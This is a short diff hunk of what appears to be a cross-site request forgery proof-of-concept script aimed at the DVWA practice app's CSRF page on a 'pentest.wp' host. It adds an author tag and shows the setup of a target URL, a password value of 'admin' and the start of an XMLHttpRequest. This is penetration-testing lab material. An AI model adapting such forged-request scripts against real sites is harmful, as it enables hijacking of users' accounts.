@@ -1,4 +1,7 @@
 <script>
+    /**
+     * Author hd7exploit
+     */
     var theUrl = 'http://pentest.wp/dvwa/vulnerabilities/csrf/';
     var pass = 'admin';
     if (window.XMLHttpRequest){
